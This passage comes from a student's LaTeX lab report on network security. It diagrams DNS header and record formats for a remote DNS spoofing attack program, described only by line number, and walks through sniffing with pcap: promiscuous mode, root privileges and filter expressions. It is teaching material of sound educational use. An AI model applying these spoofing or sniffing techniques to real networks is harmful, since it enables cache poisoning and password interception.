		\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-5.5);
		\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
		\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-5.5);
		\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
		\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-5.5);
		\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
		\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-5.5);
		\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
		\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-5.5);
		\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
		
		\draw[line width=0.2mm](0.4,0.2) -- (0.4,-5.1);
		\draw[line width=0.2mm](0.8,0.2) -- (0.8,-5.1);
		\draw[line width=0.2mm](1.2,0.2) -- (1.2,-5.1);
		\draw[line width=0.4mm](1.6,0.35) -- (1.6,-5.25);
		\draw[line width=0.2mm](2,0.2) -- (2,-5.1);
		\draw[line width=0.2mm](2.4,0.2) -- (2.4,-5.1);
		\draw[line width=0.2mm](2.8,0.2) -- (2.8,-5.1);
		
		\draw[line width=0.2mm](3.6,0.2) -- (3.6,-5.1);
		\draw[line width=0.2mm](4,0.2) -- (4,-5.1);
		\draw[line width=0.2mm](4.4,0.2) -- (4.4,-5.1);
		\draw[line width=0.4mm](4.8,0.35) -- (4.8,-5.25);
		\draw[line width=0.2mm](5.2,0.2) -- (5.2,-5.1);
		\draw[line width=0.2mm](5.6,0.2) -- (5.6,-5.1);
		\draw[line width=0.2mm](6,0.2) -- (6,-5.1);
		
		\draw[line width=0.2mm](6.8,0.2) -- (6.8,-5.1);
		\draw[line width=0.2mm](7.2,0.2) -- (7.2,-5.1);
		\draw[line width=0.2mm](7.6,0.2) -- (7.6,-5.1);
		\draw[line width=0.4mm](8,0.35) -- (8,-5.25);
		\draw[line width=0.2mm](8.4,0.2) -- (8.4,-5.1);
		\draw[line width=0.2mm](8.8,0.2) -- (8.8,-5.1);
		\draw[line width=0.2mm](9.2,0.2) -- (9.2,-5.1);
		
		\draw[line width=0.2mm](10,0.2) -- (10,-5.1);
		\draw[line width=0.2mm](10.4,0.2) -- (10.4,-5.1);
		\draw[line width=0.2mm](10.8,0.2) -- (10.8,-5.1);
		\draw[line width=0.4mm](11.2,0.35) -- (11.2,-5.25);
		\draw[line width=0.2mm](11.6,0.2) -- (11.6,-5.1);
		\draw[line width=0.2mm](12,0.2) -- (12,-5.1);
		\draw[line width=0.2mm](12.4,0.2) -- (12.4,-5.1);
		
		\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
		\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 32};
		\draw[line width=0.5mm] (0,-3.4) -- (-0.5,-3.4);
		\draw (-0.5,-3.4) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 64};
		
		%First Row
		\draw[fill=white!50] (0,0) rectangle node{\footnotesize Transaction ID} (6.38,-1.5);
		\draw[fill=white!50] (6.42,0) rectangle node[align=center,text width=0.38cm]{\footnotesize Q\\R} (6.8,-1.5);
		\draw[fill=white!50] (6.8,0) rectangle node{\footnotesize Opcode} (8.4,-1.5);
		
		%Sub-top Row
		\draw[fill=white!50] (8.4,0) rectangle node{\footnotesize DNS Flags} (11.19,-0.75);
		%Sub-bottom Row
		\draw[fill=white!50] (8.4,-0.75) rectangle node{\tiny AA} (8.8,-1.5);
		\draw[fill=white!50] (8.8,-0.75) rectangle node{\tiny TC} (9.2,-1.5);
		\draw[fill=white!50] (9.2,-0.75) rectangle node{\tiny RD} (9.6,-1.5);
		\draw[fill=white!50] (9.6,-0.75) rectangle node{\tiny RA} (10,-1.5);
		\draw[fill=white!50] (10,-0.75) rectangle node{\tiny Z} (10.4,-1.5);
		\draw[fill=white!50] (10.4,-0.75) rectangle node{\tiny AD} (10.8,-1.5);
		\draw[fill=white!50] (10.8,-0.75) rectangle node{\tiny CD} (11.19,-1.5);
		
		\draw[fill=white!50] (11.21,0) rectangle node{\footnotesize RCode} (12.8,-1.5);
		
		%Second Row
		\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Number of Questions} (6.38,-3.2);
		\draw[fill=white!50] (6.42,-1.7) rectangle node{\footnotesize Number of Answers Resource Records} (12.8,-3.2);
		
		%Third Row
		\draw[fill=white!50] (0,-3.4) rectangle node{\footnotesize Number of Authority Resource Records} (6.38,-4.9);
		\draw[fill=white!50] (6.42,-3.4) rectangle node{\footnotesize Number of Additional Resource Records} (12.8,-4.9);

		\end{tikzpicture}
		\flushleft
		Field definitions:\\
		\begin{enumerate}
		\itemsep0em
		\item QR -- Query (0) $|$ Response (1)
		\item DNS Flags:
		\begin{enumerate}
		\itemsep0em
		\item AA -- Authoritative Answer
		\item TC -- Truncated Answer (Set if packet is larger than UDP maximum size of 512 bytes)
		\item RD -- Recursive Desired (Set if query is recursive)
		\item RA -- Recursive Available
		\item Z -- Reserved for future use
		\item AD -- Authentic Data (Set in DNSSEC, part of Z in legacy systems)
		\item CD -- Checking Disabled (Set in DNSSEC, part of Z in legacy systems)
		\end{enumerate}
		\item RCode -- Return Code (0 for no error, 3 if name is non-existent)
		\end{enumerate}
		\caption{DNS Header}
			\label{fig:DNSHead}
		\end{figure}
		\noindent The following figure illustrates the structure of the question \textit{query} of the DNS packet, with relevant information being filled up using lines 410 - 419. below\footref{IETF}\footnote[5]{\url{http://www.networksorcery.com/enp/protocol/dns.htm}\label{RR}}.
		
		\begin{figure}[H]
		\centering
		\tikzset{>=stealth'}
		\begin{tikzpicture}
		
		\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
		\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-3.8);
		\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
		\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-3.8);
		\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
		\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-3.8);
		\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
		\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-3.8);
		\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
		\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-3.8);
		\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
		
		\draw[line width=0.2mm](0.4,0.2) -- (0.4,-3.4);
		\draw[line width=0.2mm](0.8,0.2) -- (0.8,-3.4);
		\draw[line width=0.2mm](1.2,0.2) -- (1.2,-3.4);
		\draw[line width=0.4mm](1.6,0.35) -- (1.6,-3.55);
		\draw[line width=0.2mm](2,0.2) -- (2,-3.4);
		\draw[line width=0.2mm](2.4,0.2) -- (2.4,-3.4);
		\draw[line width=0.2mm](2.8,0.2) -- (2.8,-3.4);
		
		\draw[line width=0.2mm](3.6,0.2) -- (3.6,-3.4);
		\draw[line width=0.2mm](4,0.2) -- (4,-3.4);
		\draw[line width=0.2mm](4.4,0.2) -- (4.4,-3.4);
		\draw[line width=0.4mm](4.8,0.35) -- (4.8,-3.55);
		\draw[line width=0.2mm](5.2,0.2) -- (5.2,-3.4);
		\draw[line width=0.2mm](5.6,0.2) -- (5.6,-3.4);
		\draw[line width=0.2mm](6,0.2) -- (6,-3.4);
		
		\draw[line width=0.2mm](6.8,0.2) -- (6.8,-3.4);
		\draw[line width=0.2mm](7.2,0.2) -- (7.2,-3.4);
		\draw[line width=0.2mm](7.6,0.2) -- (7.6,-3.4);
		\draw[line width=0.4mm](8,0.35) -- (8,-3.55);
		\draw[line width=0.2mm](8.4,0.2) -- (8.4,-3.4);
		\draw[line width=0.2mm](8.8,0.2) -- (8.8,-3.4);
		\draw[line width=0.2mm](9.2,0.2) -- (9.2,-3.4);
		
		\draw[line width=0.2mm](10,0.2) -- (10,-3.4);
		\draw[line width=0.2mm](10.4,0.2) -- (10.4,-3.4);
		\draw[line width=0.2mm](10.8,0.2) -- (10.8,-3.4);
		\draw[line width=0.4mm](11.2,0.35) -- (11.2,-3.55);
		\draw[line width=0.2mm](11.6,0.2) -- (11.6,-3.4);
		\draw[line width=0.2mm](12,0.2) -- (12,-3.4);
		\draw[line width=0.2mm](12.4,0.2) -- (12.4,-3.4);
		
		\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
		\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} $\alpha$};
		
		%First Row
		\draw[fill=white!50] (0,0) rectangle node{\footnotesize Query Name (variable length)} (12.8,-1.5);
		
		%Second Row
		\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Query Type} (6.38,-3.2);
		\draw[fill=white!50] (6.42,-1.7) rectangle node{\footnotesize Query Class} (12.8,-3.2);

		\end{tikzpicture}
		\caption{Question Query Format}
			\label{fig:Query}
		\end{figure}
		
		\noindent Lines 79 -- 103 creates the structure for the answers, nameservers section of the DNS packet, which is illustrated in the figure below\footref{IETF}\footref{RR}.
		\begin{figure}[H]
					\centering
					\tikzset{>=stealth'}
					\begin{tikzpicture}
					
					\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
					\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-7.2);
					\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
					\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-7.2);
					\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
					\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-7.2);
					\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
					\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-7.2);
					\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
					\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-7.2);
					\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
					
					\draw[line width=0.2mm](0.4,0.2) -- (0.4,-6.8);
					\draw[line width=0.2mm](0.8,0.2) -- (0.8,-6.8);
					\draw[line width=0.2mm](1.2,0.2) -- (1.2,-6.8);
					\draw[line width=0.4mm](1.6,0.35) -- (1.6,-6.95);
					\draw[line width=0.2mm](2,0.2) -- (2,-6.8);
					\draw[line width=0.2mm](2.4,0.2) -- (2.4,-6.8);
					\draw[line width=0.2mm](2.8,0.2) -- (2.8,-6.8);
					
					\draw[line width=0.2mm](3.6,0.2) -- (3.6,-6.8);
					\draw[line width=0.2mm](4,0.2) -- (4,-6.8);
					\draw[line width=0.2mm](4.4,0.2) -- (4.4,-6.8);
					\draw[line width=0.4mm](4.8,0.35) -- (4.8,-6.95);
					\draw[line width=0.2mm](5.2,0.2) -- (5.2,-6.8);
					\draw[line width=0.2mm](5.6,0.2) -- (5.6,-6.8);
					\draw[line width=0.2mm](6,0.2) -- (6,-6.8);
					
					\draw[line width=0.2mm](6.8,0.2) -- (6.8,-6.8);
					\draw[line width=0.2mm](7.2,0.2) -- (7.2,-6.8);
					\draw[line width=0.2mm](7.6,0.2) -- (7.6,-6.8);
					\draw[line width=0.4mm](8,0.35) -- (8,-6.95);
					\draw[line width=0.2mm](8.4,0.2) -- (8.4,-6.8);
					\draw[line width=0.2mm](8.8,0.2) -- (8.8,-6.8);
					\draw[line width=0.2mm](9.2,0.2) -- (9.2,-6.8);
					
					\draw[line width=0.2mm](10,0.2) -- (10,-6.8);
					\draw[line width=0.2mm](10.4,0.2) -- (10.4,-6.8);
					\draw[line width=0.2mm](10.8,0.2) -- (10.8,-6.8);
					\draw[line width=0.4mm](11.2,0.35) -- (11.2,-6.95);
					\draw[line width=0.2mm](11.6,0.2) -- (11.6,-6.8);
					\draw[line width=0.2mm](12,0.2) -- (12,-6.8);
					\draw[line width=0.2mm](12.4,0.2) -- (12.4,-6.8);
					
					\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
					\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} $\alpha$};
					\draw[line width=0.5mm] (0,-3.4) -- (-0.5,-3.4);
					\draw (-0.5,-3.4) node[xshift=-0.5cm, yshift=-0.3cm]{\color{red} $\alpha$$+$$32$};
					\draw[line width=0.5mm] (0,-5.1) -- (-0.5,-5.1);
					\draw (-0.5,-5.1) node[xshift=-0.5cm, yshift=-0.3cm]{\color{red} $\alpha$$+$$64$};
					
					%First Row
					\draw[fill=white!50] (0,0) rectangle node{\footnotesize Name (variable length)} (12.8,-1.5);
					
					%Second Row
					\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Type} (6.38,-3.2);
					\draw[fill=white!50] (6.42,-1.7) rectangle node{\footnotesize Class} (12.8,-3.2);
					
					%Third Row
					\draw[fill=white!50] (0,-3.4) rectangle node{\footnotesize Time To Live (TTL)} (12.8,-4.9);
					
					%Fourth Row
					\draw[fill=white!50] (0,-5.1) rectangle node{\footnotesize Resource Data Length} (6.38,-6.6);
					\draw[fill=white!50] (6.42,-5.1) rectangle node{\footnotesize Resource Data (variable length)} (12.8,-6.6);
					\end{tikzpicture}
					\caption{Resource Record Format}
						\label{fig:RRForm}
					\end{figure}
					\noindent Lines 119 -- 152 involves the implementation of the checksum (checking) algorithm for the UDP packets\footnote[6]{\url{https://tools.ietf.org/html/rfc791\#section-3.1}}. For the UDP checksum to be calculated, a psuedo-header needs to be constructed from the IP packet. This also catches incorrectly routed packets. The payload, together with the UDP header and some fields of the IP header are included in the calculation\footnote[7]{\url{https://stackoverflow.com/questions/1480580/udp-checksum-calculation}}.\\\\
					Lines 156 -- 366 involves the construction of the response packet with the relevant data. Of things to note is line 293, where the destination IP address being used is the IP address of the genuine nameserver for \texttt{example.com}. To check the IP address for the nameserver, running \texttt{dig example.com} is sufficient as the additional section will show the IP address (A record) of the nameservers.
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{digexample}
\caption{Original Domain Query}
\label{fig:digexample}
\end{figure}
\noindent Lines 368 -- 543 deal with the construction of the query packet and the sending of it to the destination IP address. One difference between the response packet and the query packet are lines 184 and 407, where the response packet (line 184) clearly has the query flag set while the query packet (line 407) has the response flag marked.\\\\Further, lines 217 and 249 contain the IP address to the A record for the resource on the domain \texttt{example.com}. This record must be present in the domain zone of the server or otherwise the nameserver will be considered invalid.
\newpage
\section{Further Explanations\protect\footnote[8]{\href{https://www.tenouk.com/Module42.html}{Information courtesy of https://www.tenouk.com/Module42.html}}}
To understand how the packets are constructed, the entire TCP/IP stack needs to be analysed. There are 4 layers in the TCP/IP stack (condensed from 7 in the OSI model). The functions of each layer are unique and illustrated in the figure below.
		\begin{figure}[H]
			\centering
			\tikzset{>=stealth'}
			\begin{tikzpicture}
			
			\draw (-1.6,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=right] {Layer\\Number};
			\draw[<-,line width=0.5mm,fill=black] (-0.2,0.6) -- (-0.2,-7.2);
			
			
			\draw (-0.5,-0.75) node[xshift=-0.1cm]{\color{red} 4};
			\draw (-0.5,-2.45) node[xshift=-0.1cm]{\color{red} 3};
			\draw (-0.5,-4.15) node[xshift=-0.1cm]{\color{red} 2};
			\draw (-0.5,-5.85) node[xshift=-0.1cm]{\color{red} 1};
			
			%First Row
			\draw (0,0) rectangle node[text width=9.5cm, align=center]{Application\\\footnotesize Consists of applications that use the network} (9.5,-1.5);
			
			%Second Row
			\draw (0,-1.7) rectangle node[text width=9.5cm,align=center]{Transport\\\footnotesize Provides end-to-end data delivery} (9.5,-3.2);
			
			%Third Row
			\draw (0,-3.4) rectangle node[text width=9.5cm, align=center]{Network/Internet Layer\\\footnotesize Defines datagrams handles routing of data} (9.5,-4.9);
			
			%Fourth Row
			\draw (0,-5.1) rectangle node[text width=9.5cm,align=center]{Physical/Data Link/Network Access Layer\\\footnotesize Consists of routines for accessing physical media} (9.5,-6.6);
			\end{tikzpicture}
			\caption{TCP/IP Stack}
				\label{fig:TCPIPStack}
			\end{figure}
			\noindent As data is transmitted from the higher layers to the network access layer for transmission to other systems, data is encapsulated at every other layer. Likewise, when data is passed onto the higher layers, the encapsulation is stripped. This illustration is provided in the following figure.
			\begin{figure}[H]
		\centering
		\tikzset{>=stealth'}
		\begin{tikzpicture}
		%First Row
		\draw (0,-0.5) node{Application Layer};
		\draw[fill=blue!5] (9,0) rectangle node{Data} (10.5,-1);
		%Second Row
		\draw (0,-1.7) node{Transport Layer};
		\draw[fill=blue!5] (7.5,-1.2) rectangle node{Header} (9,-2.2);
		\draw[fill=red!10] (9,-1.2) rectangle node{Data} (10.5,-2.2);
		%Third Row
		\draw (0,-2.9) node{Network Layer};
		\draw[fill=blue!5] (6,-2.4) rectangle node{Header} (7.5,-3.4);
		\draw[fill=red!10] (7.5,-2.4) rectangle node{Header} (9,-3.4);
		\draw[fill=red!10] (9,-2.4) rectangle node{Data} (10.5,-3.4);
		%Fourth Row
		\draw (0,-4.1) node{Network Access Layer};
		\draw[fill=blue!5] (4.5,-3.6) rectangle node{Header} (6,-4.6);
		\draw[fill=red!10] (6,-3.6) rectangle node{Header} (7.5,-4.6);
		\draw[fill=red!10] (7.5,-3.6) rectangle node{Header} (9,-4.6);
		\draw[fill=red!10] (9,-3.6) rectangle node{Data} (10.5,-4.6);
		
		\draw[<->,line width=0.2mm, bend left](10.5,-0.6) to (10.5,-1.6);
		\draw[<->,line width=0.2mm, bend left](10.5,-1.8) to (10.5,-2.8);
		\draw[<->,line width=0.2mm, bend left](10.5,-3) to (10.5,-4);
		
		\end{tikzpicture}
		\caption{TCP/IP Encapsulation}
			\label{fig:TCPIPEncase}
		\end{figure}
		\noindent How various protocols interact with each other in the TCP/IP stack allows any type of program to transmit data across the internet. These protocols have been grouped into a topological diagram for easier reference in the figure below.
		\begin{figure}[H]
				\centering
				\tikzset{>=stealth'}
				\begin{tikzpicture}
				%First Row
				\draw (-2,-0.5) node[align=left]{Application};
				\draw (1.4,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize HTTP};
				\draw (3.3,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize Telnet};
				\draw (4.99,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize FTP};
				
				\draw (7.1,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize SNMP};
				\draw (8.8,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize NFS};
				\draw (10.45,-0.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize TFTP};
				
				%Second Row
				\draw (-2.13,-1.7) node{Transport};
				\draw (3.3,-1.7)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize TCP};
				\draw (8.8,-1.7)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize UDP};

				%Third Row
				\draw (-2.26,-2.9) node{Network};
				\draw (6.05,-2.9)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize IP};
				\draw (8.8,-2.9)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize ICMP};
				
				
				%Fourth Row
				\draw (-1.61,-4.1) node{Network Access};
				\draw (6.05,-4.1)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize MAC Driver};
				\draw (3.1,-4.1)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize ARP};
				\draw (6.05,-5.5)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize NIC};
				\draw (9.12,-4.1)node[ellipse, minimum height=0.5cm,minimum width=0.8cm,draw] {\footnotesize RARP};
				
				\draw[line width=0.2mm,blue!70](-3.4,-1.1)--(11.55,-1.1);
				\draw[line width=0.2mm,blue!70](-3.4,-2.3)--(11.55,-2.3);
				\draw[line width=0.2mm,blue!70](-3.4,-3.5)--(11.55,-3.5);
				
				\draw[<->,line width=0.3mm](1.4,-0.88)--(2.82,-1.44);
				\draw[<->,line width=0.3mm](3.3,-0.85)--(3.3,-1.36);
				\draw[<->,line width=0.3mm](5.1,-0.88)--(3.78,-1.44);
				
				\draw[<->,line width=0.3mm](6.9,-0.88)--(8.32,-1.44);
				\draw[<->,line width=0.3mm](8.8,-0.85)--(8.8,-1.36);
				\draw[<->,line width=0.3mm](10.6,-0.88)--(9.28,-1.44);
				
				\draw[<->,line width=0.3mm](3.3,-2.05)--(5.73,-2.65);
				\draw[<->,line width=0.3mm](8.8,-2.05)--(6.37,-2.65);
				
				\draw[<->,line width=0.3mm](6.49,-2.9)--(7.95,-2.9);
				
				\draw[<->,line width=0.3mm](6.05,-3.26)--(6.05,-3.75);
				
				\draw[<->,line width=0.3mm](3.8,-4.1)--(4.51,-4.1);
				\draw[<->,line width=0.3mm](7.57,-4.1)--(8.24,-4.1);
				
				\draw[<->,line width=0.3mm](6.05,-4.45)--(6.05,-5.15);
				
				\draw[<->,line width=0.3mm](3.1,-5.5)--(5.42,-5.5);
				\draw(2.42,-5.47) node{Packet};
				
				\end{tikzpicture}
				\caption{Protocol Topology}
					\label{fig:TCPIPTree}
				\end{figure}
%PDF 5: Packet Sniffing and Spoofing%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Packet Sniffing \& Spoofing}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
Packet sniffing and spoofing are crucial in network security and can be destructive when maliciously used. Understanding these two threats is core in implementing network security mechanisms. Freely available and widely used sniffing and spoofing tools include \textit{Ethereal}, \textit{Wireshark}, \textit{Netwox} etc. These are some of the tools that are used by network security experts and attackers alike. This lab will focus on how these programs work and provide insights on how sniffing and spoofing programs are written.
\section{Overview}
This lab will consist of three main tasks. The first task will involve using a sample program to sniff packets using filters and extracting plaintext passwords. Following that would be the spoofing of packets with fake data and sending it out through the network. Concluding this lab will be the combination of both sniffing and spoofing into a single program.
\section{Exploration}
\subsection{Sniffing Packets}
For this part, a sample sniffing program \texttt{sniffex.c} has been provided and the source code made available by Tim Carstens\footnote{\url{https://www.tcpdump.org/pcap.html}}. The code makes use of the \texttt{pcap} library, which simplifies the writing of programs involving network packets.
\subsubsection{Understanding \texttt{sniffex}}
To see the usefulness of the program, the source code must first be downloaded and compiled. The compilation of the source code requires execution of the following line.
\begin{verbatim}
$ gcc -Wall -o sniffex sniffex.c -lpcap
\end{verbatim}
To ensure the program works as expected, the program is run by executing \texttt{sniffex} directly using Terminal. The default packet capture mode is \textbf{10} packets that have the \texttt{IP} protocol header. To verify whether the packets captured are genuine, it is counterchecked against Wireshark. For Wireshark itself, the filter expression used to display the relevant captured packets is \texttt{ip}. In addition, the Network Interface Card (NIC) that is used to capture the packets must be set to \texttt{eth0} (primary NIC).

\begin{figure}[H]
\centering
\includegraphics[width=1\linewidth]{sniffok}
\caption{Sniffing Program Capture}
\label{fig:sniffok}
\end{figure}

\noindent From Figure \ref{fig:sniffok}, it is immediately noticeable that the packets captured are correct as both programs reflect the same packets that were captured. *Note: The DNS, DHCP \& BROWSER packets that were captured in Wireshark use the UDP protocol for packet transmission. Refer to Appendix A of the Remote DNS Attack lab for detailed explanation on the structure of the DNS packet.\\\\
\noindent
\textbf{Problem 1:}\\ Describe the sequence of library calls that are essential for the sniffer program.\\\\
\textbf{Answer 1:}\\
The source code is analysed to determine the sequence of calls made to the \texttt{pcap} library which are essential in the sniffing program. The calls can be grouped into 5 main blocks and the purpose of each function can be found on the \texttt{man} page of \href{http://www.tcpdump.org/manpages/pcap.3pcap.html}{\texttt{pcap}}.


\begin{itemize}
	\itemsep0em
	\item The first requirement involves the selection of the NIC by the user unless it is not specified. In such cases, the first NIC that \texttt{pcap} finds is used (except for the \textit{loopback} (\texttt{lo}) interface). (Lines 519 -- 535)
	\begin{enumerate}
	\item The process of automatically selecting a suitable NIC is performed by the function call \texttt{pcap\_lookupdev}. (Line 529)
	\item Next, the function \texttt{pcap\_lookupnet} then obtains the network details of the selected NIC. (Line 538)
	\end{enumerate}
			\item The NIC must be opened and checked to ensure that it is the correct type of interface that we are capturing packets from. In this instance, it is a Ethernet connection (NAT adapter). (Lines 550 -- 568)
	\begin{enumerate}

	\item The selected NIC needs to be opened to capture the packets, completed by \texttt{pcap\_open\_live}. (Line 551)
	\item The checking of the NIC is handled by \texttt{pcap\_datalink}. As the NAT adapter is viewed by the Virtual Machine (VM) as an Ethernet connection, it should return \texttt{DLT\_EN10MB}. (Line 558)

		\end{enumerate}
		\item To capture relevant packets, filter expressions must be written, checked and compiled before starting the process. (Lines 510, 563 -- 575)
		\begin{enumerate}
		
	\item The filter needs to be compiled into a program before it can be used later and this is handled by the function call \texttt{pcap\_compile} (Line 564)
	\item The filter program compiled in the previous point is applied by the function \texttt{pcap\_setfilter}. (Line 571)
	\end{enumerate}


	\item The process of parsing the packet's details and data is declared by the function \texttt{pcap\_loop}. The function is looped depending on the number of packets that need to be captured. (Line 578)
			\item To ensure that the capturing process is terminated properly, post-operations are required. (Lines 577 -- 582)
		\begin{enumerate}
	\item Memory that was previously used and currently unused is freed up by calling \texttt{pcap\_freecode}. This memory was first generated when \texttt{pcap\_compile} was first called and subsequently used by \texttt{pcap\_setfilter}. (Line 581)
	\item After the sniffing session has been completed, \texttt{pcap\_close} terminates the session. (Line 582)
		\end{enumerate}
\end{itemize}
\vspace{1em}
\noindent
\textbf{Problem 2:}\\
Why does \texttt{sniffex} require root privileges and where does it fail without root privileges?\\\\
\textbf{Answer 2:}\\
Root privileges are required when any program needs to open or inspect the list of attached NICs. This is triggered by the \texttt{pcap\_lookupdev} function on line 529. Executing \texttt{sniffex} without root privileges will result in printing of the following line: ``Couldn't find default device: no suitable device found''.\\\\
\textbf{Problem 3:}\\
Turn on and off promiscuous mode in the sniffer program. What is the difference when this mode is turned on and off?\\\\
\textbf{Answer 3:}\\
When promiscuous mode is off, the sniffing program will only capture packets that has been addressed to that NIC, broadcasts and multicasts.\\\\
When promiscuous mode is turned on, the sniffing program will capture \textbf{all} packets on the local network, even if the destination of the packet is not for the NIC that is executing the sniffing program.\\\\To turn promiscuous mode on or off, the third argument of \texttt{pcap\_open\_live} is set to \texttt{1} or \texttt{0} respectively (line 551).
\begin{verbatim}
pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf); //Promiscuous on
pcap_open_live(dev, SNAP_LEN, 0, 1000, errbuf); //Promiscuous off
\end{verbatim}
To show the result clearly, another NIC is created for the VM but set to ``bridged'' mode. This allows the network card to interface directly with the network of the physical system. When executing the sniffing program, the ``bridged'' NIC must be specified with the argument \texttt{eth1} or the program will default to the NAT adapter which is not desired. For reference, the IP address of the physical system is \texttt{192.168.1.3} while the IP address on the ``bridged'' NIC is \texttt{192.168.1.7}. \\\\On the physical system, the following command(s) are run on Command Prompt or Terminal, depending on the operating system used.\\\\
Windows (Command Prompt):
\begin{verbatim}
ping -t 8.8.8.8
\end{verbatim}
Linux (Terminal):
\begin{verbatim}
ping 8.8.8.8
\end{verbatim}
The differences between promiscuous mode and non-promiscuous mode are immediately clear, as seen from Figure \ref{fig:prom} and \ref{fig:nonprom} respectively. When promiscuous mode is enabled, Google's IP address (8.8.8.8) becomes visible in our captured packets but not in the non-promiscuous mode.
\begin{figure}[H]
    \centering
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{prom}
\caption{Promiscuous Mode}
\label{fig:prom}
\end{subfigure}
~
\begin{subfigure}[H]{0.45\textwidth}
\centering
\includegraphics[width=1\linewidth]{nonprom}
\caption{\textbf{Non-}Promiscuous Mode}
\label{fig:nonprom}
\end{subfigure}
    \caption{Different Capturing Modes}
    %\label{fig:lengthdetermination}
\end{figure}
\noindent *Note: IP addresses \texttt{224.0.0.1} and \texttt{224.0.0.251} are multicast addresses that define a group of hosts within the \textbf{local} subnetwork. The various types of multicast addresses are defined in \href{https://tools.ietf.org/html/rfc5771}{RFC 5771}. Furthermore, in promiscuous mode foreign IP addresses can also be seen interacting with the physical system, such as \texttt{124.27.65.148}.
\subsubsection{Writing Filters}
In order for us to capture relevant packets for analysis, filters must be applied. This task will focus on writing specific filters to capture required packets.
\begin{itemize}
\item Capture ICMP packets between two specific hosts
\end{itemize}
The two hosts used is our VM (192.168.1.7) and the physical machine (192.168.1.3) as the network adapter is already in ``bridged'' mode. Referencing the \href{https://www.tcpdump.org/manpages/pcap-filter.7.html}{\texttt{man}} page for \texttt{pcap}, we can easily write out the required filter.
\begin{verbatim}
icmp and (host 192.168.1.7 or host 192.168.1.3)
\end{verbatim}
To create ICMP packets, the \texttt{ping} command can be used via Terminal or Command Prompt. 
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{icmpping}
\caption{ICMP Between Two Hosts}
\label{fig:icmpping}
\end{figure}

\begin{itemize}
\item Capture TCP packets that have a destination port range from to port 10 -- 100.
\end{itemize}
For the following, the \texttt{dst portrange} filter can be applied to focus on the required destination port range. 
\begin{verbatim}
tcp dst portrange 10-100
\end{verbatim}
To initiate the capture, any FTP program can be used to open the connection. As FTP uses TCP port 21, it falls within our filtered scope and the packets will be captured by the program and printed out.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{portrange}
\caption{TCP \& Destination Port 10 -- 100}
